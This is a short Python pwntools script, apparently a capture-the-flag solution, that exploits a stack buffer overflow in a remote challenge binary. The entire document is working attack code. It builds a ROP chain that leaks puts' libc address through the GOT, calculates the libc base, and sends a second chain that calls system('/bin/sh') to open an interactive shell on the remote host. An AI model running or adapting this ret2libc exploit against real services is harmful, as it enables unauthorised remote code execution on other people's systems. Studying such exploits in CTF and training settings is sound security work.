from pwn import *
libc=ELF('libc.so.6')
io=remote('gz.imxbt.cn',20336)
elf = ELF("./pwn")
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
rdi=0x401176
ret = 0x40101a
io.recv()
payload=b'a'*(0xa+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
io.sendline(payload)
puts_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print(hex(libc_base))
system_addr = libc_base + libc.sym["system"]
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
payload = b'a'*(0xa+8) + p64(rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)
io.sendline(payload)
io.interactive()